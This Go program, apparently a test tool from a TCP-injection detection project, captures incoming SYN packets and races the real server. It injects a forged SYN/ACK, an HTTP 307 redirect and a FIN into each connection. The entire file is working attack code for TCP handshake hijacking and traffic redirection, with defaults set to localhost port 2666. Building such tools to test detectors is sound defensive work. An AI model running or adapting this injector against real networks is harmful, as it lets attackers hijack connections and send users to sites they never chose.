package main

import (
	"code.google.com/p/gopacket"
	"code.google.com/p/gopacket/examples/util"
	"code.google.com/p/gopacket/layers"
	"code.google.com/p/gopacket/pcap"
	"code.google.com/p/gopacket/tcpassembly"
	"flag"
	"github.com/david415/HoneyBadger/inject"
	"log"
	"math/rand"
	"time"
)

var iface = flag.String("i", "lo", "Interface to get packets from")
var filter = flag.String("f", "tcp and dst port 2666 and tcp[tcpflags] == tcp-syn", "BPF filter for pcap")
var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
var servicePort = flag.Int("e", 2666, "target TCP flows from this port")

func main() {
	defer util.Run()()

	var eth layers.Ethernet
	var dot1q layers.Dot1Q
	var ip4 layers.IPv4
	var tcp layers.TCP
	var payload gopacket.Payload

	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	hijackSeq := r.Uint32()

	decoded := make([]gopacket.LayerType, 0, 4)

	streamInjector := inject.TCPStreamInjector{}
	err := streamInjector.Init("0.0.0.0")
	if err != nil {
		panic(err)
	}

	handle, err := pcap.OpenLive(*iface, int32(*snaplen), true, pcap.BlockForever)
	if err != nil {
		log.Fatal("error opening pcap handle: ", err)
	}
	if err := handle.SetBPFFilter(*filter); err != nil {
		log.Fatal("error setting BPF filter: ", err)
	}
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
		&eth, &dot1q, &ip4, &tcp, &payload)

	log.Print("collecting packets...\n")
	for {
		data, ci, err := handle.ZeroCopyReadPacketData()
		if err != nil {
			log.Printf("error getting packet: %v %s", err, ci)
			continue
		}
		err = parser.DecodeLayers(data, &decoded)
		if err != nil {
			log.Printf("error decoding packet: %v", err)
			continue
		}

		// craft a response to the client
		// here we reuse the client's header
		// by swapping addrs and ports

		// swap ip addrs
		srcip := ip4.SrcIP
		ip4.SrcIP = ip4.DstIP
		ip4.DstIP = srcip

		// swap ports
		srcport := tcp.SrcPort
		tcp.SrcPort = tcp.DstPort
		tcp.DstPort = srcport

		// empty payload for SYN/ACK handshake completion
		streamInjector.Payload = []byte("")
		seq := tcp.Seq
		tcp.Seq = hijackSeq
		tcp.Ack = uint32(tcpassembly.Sequence(seq).Add(1))
		tcp.ACK = true
		tcp.SYN = true
		tcp.RST = false

		err = streamInjector.SetIPLayer(ip4)
		if err != nil {
			panic(err)
		}
		streamInjector.SetTCPLayer(tcp)
		err = streamInjector.Write()
		if err != nil {
			panic(err)
		}
		log.Print("SYN/ACK packet sent!\n")

		// send rediction payload
		redirect := "HTTP/1.1 307 Moved Permanently\r\nLocation: http://127.0.0.1/?\r\n\r\n"
		streamInjector.Payload = []byte(redirect)
		tcp.PSH = true
		tcp.SYN = false
		tcp.ACK = true
		tcp.Ack = uint32(tcpassembly.Sequence(seq).Add(1))
		tcp.Seq = uint32(tcpassembly.Sequence(hijackSeq).Add(1))

		err = streamInjector.SetIPLayer(ip4)
		if err != nil {
			panic(err)
		}
		streamInjector.SetTCPLayer(tcp)
		err = streamInjector.Write()
		if err != nil {
			panic(err)
		}
		log.Print("redirect packet sent!\n")

		// send FIN
		streamInjector.Payload = []byte("")
		tcp.FIN = true
		tcp.SYN = false
		tcp.ACK = false
		tcp.Seq = uint32(tcpassembly.Sequence(hijackSeq).Add(2))

		err = streamInjector.SetIPLayer(ip4)
		if err != nil {
			panic(err)
		}
		streamInjector.SetTCPLayer(tcp)
		err = streamInjector.Write()
		if err != nil {
			panic(err)
		}
		log.Print("FIN packet sent!\n")
	}
}
